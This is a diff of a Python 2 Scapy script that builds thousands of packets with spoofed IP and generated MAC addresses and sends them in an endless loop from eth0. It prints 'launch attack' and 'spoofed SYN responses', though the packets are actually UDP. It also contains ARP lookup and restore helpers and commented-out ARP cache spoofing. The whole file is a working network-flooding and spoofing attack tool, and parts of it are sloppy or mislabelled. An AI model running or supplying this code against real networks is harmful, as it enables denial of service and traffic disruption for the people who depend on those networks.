@@ -1,12 +1,97 @@
+from scapy.all import *
 
-import sys
 import time
 from os import popen
-import logging
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-from scapy.all import sendp, IP, UDP, Ether, TCP, RandMAC, ICMP
 from random import randrange
-import time
+import signal
+
+def getmac(targetip):
+  arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
+  targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
+  return targetmac
+
+def restorearp(targetip, targetmac, sourceip, sourcemac):
+  packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
+  send(packet, verbose=False)
+  print "ARP Table restored to normal for", targetip
+
+
+def srcMACgen(total=10000):
+  src=[]
+  dst=[]
+  i=0
+  for y in xrange(0,254):
+    for x in xrange(0,254):
+      pack=intToStr(0) + ":" + intToStr(0) + ":" + intToStr(0) + ":" + intToStr(0) + ":" + intToStr(y) + ":" + intToStr(x)
+      pack2=intToStr(0) + ":" + intToStr(0) + ":" + intToStr(x) + ":" + intToStr(y) + ":" + intToStr(0) + ":" + intToStr(0)
+      src.append(pack)
+      dst.append(pack2)
+      i+=1
+      if total <= i :
+        return src,dst
+        break
+  return src,dst
+def intToStr(var):
+  if var < 16:
+    a = hex(var).replace("x","")
+  else:
+    a = hex(var)[2:]
+  return a  
+def exit_gracefully(self,signum, frame):
+    raise KeyboardInterrupt()
+
+def generate_packets():
+    packet_list = []        #initializing packet_list to hold all the packets
+    src,dst=srcMACgen()
+    for i in xrange(0,9000):
+        packet  = Ether(src=src[i],dst=dst[i])/IP(dst=sourceIPgen(),src=sourceIPgen())/UDP(dport=80) 
+        packet_list.append(packet)
+    return packet_list
+def main():
+  # signal.signal(signal.SIGINT, exit_gracefully)
+  # targetip= raw_input("Enter Target IP:")
+  # targetip="10.0.0.4"
+  # try:
+  #   targetmac= getmac(targetip)
+  #   print "Target MAC", targetmac
+  # except:
+  #   print "Target machine did not respond to ARP broadcast"
+  #   quit()
+  interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
+
+  print "prepare packets"
+  # print "generate address"
+  # src,dst=srcMACgen(11000)
+  # print len(src)
+  # print len(dst)
+
+  packet_list=[]
+ 
+  packets = generate_packets()
+  packet_list.append(packets)
+
+
+
+  print "launch attack"
+  try:
+    print "Sending spoofed SYN responses"
+    while True:
+      # spoofed = Ether()/IP(dst='10.0.0.2',src=sourceIPgen())/UDP(dport=1,sport=80)
+      # packets = Ether(src=RandMAC())/IP(dst='10.0.0.2',src=sourceIPgen())/UDP(dport=1,sport=80)
+      # sendp(packets,iface=interface.rstrip(), verbose= False,inter=1)
+      
+      for packets in packet_list:
+        sendp( packets,iface=interface.rstrip(), verbose=0)
+
+      
+      # spoofarpcache(gatewayip, gatewaymac, targetip)
+  except KeyboardInterrupt:
+    print "SYN spoofing stopped"
+    
+    # restorearp(gatewayip, gatewaymac, targetip, targetmac)
+    # restorearp(targetip, targetmac, gatewayip, gatewaymac)
+    quit()
+
 def sourceIPgen():
 
 #this function generates random IP addresses
@@ -23,56 +108,6 @@ def sourceIPgen():
   ip = ".".join([str(first),str(randrange(1,256)), str(randrange(1,256)),str(randrange(1,256))])
   # print ip
   return ip
-
-def srcMACgen():
-  first = randrange(0,252)
-  return intToStr(0) + ":" + intToStr(0) + ":" + intToStr(0) + ":" + intToStr(0) + ":" + intToStr(randrange(0,2)) + ":" + intToStr(randrange(0,255))
-
-def dstMACgen():
-  first = randrange(0,252)
-  return intToStr(0) + ":" + intToStr(0)  + ":" + intToStr(randrange(0,2)) + ":" + intToStr(randrange(0,255))+ ":" + intToStr(0) + ":" + intToStr(0)
-
-
-def intToStr(var):
-  if var < 16:
-    a = hex(var).replace("x","")
-  else:
-    a = hex(var)[2:]
-  return a
-
-
-
-def main():
-  for i in range (1,99):
-    mymain()
-    # time.sleep (2)
-#send the generated IPs 
-def mymain():
-
-#getting the ip address to send attack packets 
-  dstIP = sys.argv[1:]
-  # print dstIP
-  src_port = 80
-  dst_port = 1
-
-# open interface eth0 to send packets
-  interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
-  # print("test ", interface)
-  # print("test2 ", interface.rstrip())
-
-  for i in xrange(0,500):
-# form the packet
-    packets = Ether(src=srcMACgen(),dst=dstMACgen())/IP(dst=sourceIPgen(),src=sourceIPgen())/UDP(dport=dst_port,sport=src_port)
-    # packets = Ether(src=RandMAC())/IP(dst=dstIP,src=sourceIPgen())/ICMP()
-    # packets = Ether()/IP(dst=dstIP,src=sourceIPgen())/UDP(dport=dst_port,sport=src_port)
-    # print(repr(packets))
-
-# send packet with the defined interval (seconds) 
-    sendp( packets,iface=interface.rstrip(),inter=0.001, verbose=0)
-    
-
-#main
-
 
 if __name__=="__main__":
   main()
